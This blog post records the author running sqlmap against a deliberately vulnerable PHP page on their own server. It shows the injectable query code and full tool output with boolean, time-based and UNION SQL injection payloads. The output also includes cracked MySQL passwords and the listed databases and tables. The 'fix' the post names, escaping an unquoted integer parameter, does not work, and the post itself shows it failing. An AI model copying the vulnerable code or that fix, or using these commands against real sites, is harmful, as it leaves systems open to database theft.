---
title: CI with Dropbox
layout: post
---

# Sqlmapproject first look

Hi friends,

I was checking out [trending](https://github.com/trending) on github and found [Sqlmapproject](https://github.com/sqlmapproject/sqlmap)

So, I installed on server:

{% highlight %}
ubuntu@ip-172-31-32-255:~$ sudo -i
root@ip-172-31-32-255:~# cd /var/www/html/
root@ip-172-31-32-255:/var/www/html# mkdir sqlmap
root@ip-172-31-32-255:/var/www/html# cd sqlmap/
root@ip-172-31-32-255:/var/www/html/sqlmap# git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
Cloning into 'sqlmap-dev'...
remote: Counting objects: 49801, done.
remote: Compressing objects: 100% (51/51), done.
remote: Total 49801 (delta 25), reused 0 (delta 0), pack-reused 49750
Receiving objects: 100% (49801/49801), 42.53 MiB | 7.34 MiB/s, done.
Resolving deltas: 100% (38219/38219), done.
Checking connectivity... done.
{% endhighlight %}

To test it there was a [cheat page](https://gist.github.com/stamparm/5335217) , where I guessed to use a format like:
{% highlight %}
python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?id=1" -z "ign,flu,bat" --banner -f
{% endhighlight %}
# Setup

I created a simple php code for testing penetration:


{% highlight %}
<!doctype html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Document</title>
</head>
<body>
	<?php
$link = mysqli_connect("localhost", "XXXXX", "XXXXX", "XXXXXX");

/* check connection */
if (mysqli_connect_errno()) {
    printf("Connect failed: %s\n", mysqli_connect_error());
    exit();
}

if(!isset($_GET['id'])) die('no id sent');
$id = $_GET['id'];
$query = "SELECT * from citrus_tx where id= $id";

if ($result = mysqli_query($link, $query)) {

    /* fetch associative array */
    while ($row = mysqli_fetch_row($result)) {
        print_r($row);
    }

    /* free result set */
    mysqli_free_result($result);
}

/* close connection */
mysqli_close($link);
?>
</body>
</html>
{% endhighlight %}

For convenience I simply dropped the file on to [dropbox sync](http://vishwakarma09.github.io/2015/11/26/ci-with-dropbox.html) and it got posed to http://bimpra.tk/test.php

#Testing

To run the test, I simply run command:
{% highlight %}
python sqlmap.py -u "http://bimpra.tk/test.php?id=0" -z "ign,flu,bat" --banner -f
{% endhighlight %}

I was astonished to see the results:
{% highlight %}
root@ip-172-31-32-255:/var/www/html/sqlmap# python sqlmap.py -u "http://bimpra.tk/test.php?id=0" -z "ign,flu,bat" --banner -f
[07:26:12] [WARNING] detected ambiguity (mnemonic 'ign' can be resolved to: 'ignore-401', 'ignore-proxy'). Resolved to shortest of those ('ignore-401')
         _
 ___ ___| |_____ ___ ___  {1.0-dev-nongit-201512030967}
|_ -| . | |     | .'| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 07:26:12

[07:26:12] [INFO] testing connection to the target URL
[07:26:12] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[07:26:12] [INFO] testing if the target URL is stable
[07:26:13] [INFO] target URL is stable
[07:26:13] [INFO] testing if GET parameter 'id' is dynamic
[07:26:13] [INFO] confirming that GET parameter 'id' is dynamic
[07:26:13] [INFO] GET parameter 'id' is dynamic
[07:26:13] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
[07:26:13] [INFO] testing for SQL injection on GET parameter 'id'
[07:26:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[07:26:13] [INFO] GET parameter 'id' seems to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[07:26:13] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'
[07:26:13] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[07:26:13] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'
[07:26:13] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[07:26:13] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace'
[07:26:13] [INFO] testing 'MySQL inline queries'
[07:26:13] [INFO] testing 'PostgreSQL inline queries'
[07:26:13] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[07:26:13] [INFO] testing 'MySQL > 5.0.11 stacked queries (SELECT - comment)'
[07:26:13] [WARNING] time-based comparison requires larger statistical model, please wait............                                                                                         
[07:26:14] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[07:26:14] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[07:26:14] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[07:26:14] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SELECT)'
[07:26:24] [INFO] GET parameter 'id' seems to be 'MySQL >= 5.0.12 AND time-based blind (SELECT)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[07:26:24] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[07:26:24] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[07:26:24] [INFO] ORDER BY technique seems to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[07:26:24] [INFO] target URL appears to have 12 columns in query
[07:26:24] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 42 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=0 AND 8637=8637

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
    Payload: id=0 AND (SELECT * FROM (SELECT(SLEEP(5)))LyAm)

    Type: UNION query
    Title: Generic UNION query (NULL) - 12 columns
    Payload: id=0 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a766271,0x4a51496e536765687942414d4f704c694e647946726474414575697047496d726b6e6744755a7377,0x71626a7171)-- -
---
[07:26:24] [INFO] testing MySQL
[07:26:24] [INFO] confirming MySQL
[07:26:24] [INFO] the back-end DBMS is MySQL
[07:26:24] [INFO] fetching banner
[07:26:24] [INFO] actively fingerprinting MySQL
[07:26:24] [INFO] executing MySQL comment injection fingerprint
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS operating system: Linux Ubuntu
back-end DBMS: active fingerprint: MySQL >= 5.5.0
               banner parsing fingerprint: MySQL 5.5.44
banner:    '5.5.44-0ubuntu0.14.04.1'
[07:26:25] [INFO] fetched data logged to text files under '/root/.sqlmap/output/bimpra.tk'

[*] shutting down at 07:26:25

root@ip-172-31-32-255:/var/www/html/sqlmap# 
{% endhighlight %}

I checked the logged data '/root/.sqlmap/output/bimpra.tk':
{% highlight %}
root@ip-172-31-32-255:~/.sqlmap/output/bimpra.tk# ll
total 24
drwxr-xr-x 2 root root 4096 Dec  3 07:40 ./
drwxr-xr-x 4 root root 4096 Dec  3 07:14 ../
-rw-r--r-- 1 root root  958 Dec  3 07:40 log
-rw-r--r-- 1 root root 5120 Dec  3 07:40 session.sqlite
-rw-r--r-- 1 root root   36 Dec  3 07:40 target.txt
{% endhighlight %}

Secondly, I run other test, I must admit it exposed the password of my root mysql user:
{% highlight %}
root@ip-172-31-32-255:/var/www/html/sqlmap# python sqlmap.py -u "http://bimpra.tk/test.php?id=0" -z "ign,bat" --passwords
[09:27:03] [WARNING] detected ambiguity (mnemonic 'ign' can be resolved to: 'ignore-401', 'ignore-proxy'). Resolved to shortest of those ('ignore-401')
         _
 ___ ___| |_____ ___ ___  {1.0-dev-nongit-201512030967}
|_ -| . | |     | .'| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 09:27:03

[09:27:03] [INFO] resuming back-end DBMS 'mysql' 
[09:27:03] [INFO] testing connection to the target URL
[09:27:03] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=0 AND 4390=4390

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
    Payload: id=0 AND (SELECT * FROM (SELECT(SLEEP(5)))qsxk)

    Type: UNION query
    Title: Generic UNION query (NULL) - 12 columns
    Payload: id=0 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7176717071,0x47706e7344436a7a4d624171784b474d7354745867564f6d4e7a676a52416550696d5979794e4e58,0x7170707171),NULL,NULL-- -
---
[09:27:03] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL 5
[09:27:03] [INFO] fetching database users password hashes
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] Y
[09:27:03] [INFO] using hash method 'mysql_passwd'
what dictionary do you want to use?
[1] default dictionary file '/var/www/html/sqlmap/txt/wordlist.zip' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[09:27:03] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[09:27:03] [INFO] starting dictionary-based cracking (mysql_passwd)
[09:27:03] [WARNING] multiprocessing hash cracking is currently not supported on this platform
[09:27:46] [INFO] cracked password 'redhat' for user 'root'                                                                                                                                   
[09:27:57] [INFO] cracked password 'csvgraph' for user 'csvgraph'                                                                                                                             
[09:27:57] [INFO] cracked password 'servicehour' for user 'servicehour'                                                                                                                       
database management system users password hashes:                                                                                                                                             
[*] csvgraph [1]:
    password hash: *B4B11C5B0AB0727F85786EDA167AD15BCA5914CF
    clear-text password: oranges
[*] debian-sys-maint [1]:
    password hash: *B4B11C5B0AB0727F85786EDA167AD15BCA5914CF
[*] phpmyadmin [1]:
    password hash: *B4B11C5B0AB0727F85786EDA167AD15BCA5914CF
    clear-text password: oranges
[*] root [1]:
    password hash: *B4B11C5B0AB0727F85786EDA167AD15BCA5914CF
    clear-text password: oranges
[*] servicehour [1]:
    password hash: *B4B11C5B0AB0727F85786EDA167AD15BCA5914CF
    clear-text password: oranges

[09:27:57] [INFO] fetched data logged to text files under '/root/.sqlmap/output/bimpra.tk'

[*] shutting down at 09:27:57

root@ip-172-31-32-255:/var/www/html/sqlmap# 
{% endhighlight %}

This is too much classified information. The next run exposed all my databases:

{% highlight %}
root@ip-172-31-32-255:/var/www/html/sqlmap# python sqlmap.py -u "http://bimpra.tk/test.php?id=1" -z "ign,bat" --dbs
[09:30:45] [WARNING] detected ambiguity (mnemonic 'ign' can be resolved to: 'ignore-401', 'ignore-proxy'). Resolved to shortest of those ('ignore-401')
         _
 ___ ___| |_____ ___ ___  {1.0-dev-nongit-201512030967}
|_ -| . | |     | .'| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 09:30:45

[09:30:46] [INFO] resuming back-end DBMS 'mysql' 
[09:30:46] [INFO] testing connection to the target URL
[09:30:46] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=0 AND 4390=4390

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
    Payload: id=0 AND (SELECT * FROM (SELECT(SLEEP(5)))qsxk)

    Type: UNION query
    Title: Generic UNION query (NULL) - 12 columns
    Payload: id=0 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7176717071,0x47706e7344436a7a4d624171784b474d7354745867564f6d4e7a676a52416550696d5979794e4e58,0x7170707171),NULL,NULL-- -
---
[09:30:46] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL 5
[09:30:46] [INFO] fetching database names
available databases [18]:
[*] bimpra
[*] csvgraph
[*] csvtest
[*] daspos
[*] diamondsis
[*] ecomm
[*] edgar
[*] exam
[*] imagesearch
[*] information_schema
[*] ippt
[*] mysql
[*] news
[*] openclassifiedads
[*] performance_schema
[*] phpmyadmin
[*] servicehour
[*] wp

[09:30:46] [INFO] fetched data logged to text files under '/root/.sqlmap/output/bimpra.tk'

[*] shutting down at 09:30:46

root@ip-172-31-32-255:/var/www/html/sqlmap# 
{% endhighlight %}

Next test revealed all my tables of wp database

{% highlight %}
root@ip-172-31-32-255:/var/www/html/sqlmap# python sqlmap.py -u "http://bimpra.tk/test.php?id=0" -z "ign,bat" --tables -D wp
[09:34:08] [WARNING] detected ambiguity (mnemonic 'ign' can be resolved to: 'ignore-401', 'ignore-proxy'). Resolved to shortest of those ('ignore-401')
         _
 ___ ___| |_____ ___ ___  {1.0-dev-nongit-201512030967}
|_ -| . | |     | .'| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 09:34:08

[09:34:08] [INFO] resuming back-end DBMS 'mysql' 
[09:34:08] [INFO] testing connection to the target URL
[09:34:08] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=0 AND 4390=4390

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
    Payload: id=0 AND (SELECT * FROM (SELECT(SLEEP(5)))qsxk)

    Type: UNION query
    Title: Generic UNION query (NULL) - 12 columns
    Payload: id=0 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7176717071,0x47706e7344436a7a4d624171784b474d7354745867564f6d4e7a676a52416550696d5979794e4e58,0x7170707171),NULL,NULL-- -
---
[09:34:08] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL 5
[09:34:08] [INFO] fetching tables for database: 'wp'
Database: wp
[11 tables]
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+

[09:34:08] [INFO] fetched data logged to text files under '/root/.sqlmap/output/bimpra.tk'

[*] shutting down at 09:34:08

root@ip-172-31-32-255:/var/www/html/sqlmap# 
{% endhighlight %}

It is end of testing. It is awesome hacking tool. I want to know if a POST module is also present, which will post data to page. Finanally, I decided to put end to this massacre by using *$id = mysql_real_escape_string($_GET['id']);*

Also, I moved the sqlmapper folder location to some other. But hacked; then I deleted the entire /root/.sqlmap/ folder, still same.

Now, I created another folder sqlmap2 and cloned git into it. Then I run command:
{% highlight %}
python sqlmap.py -u "http://bimpra.tk/test.php?id=0" -z "ign,bat" --tables -D wp
{% endhighlight %}

Again it got hacked.

Finally, I decided to change mysql root password; Again I run the above command. And guess what, it got hacked again!

I release this post now because I have terminated vps on which it was hosted :)


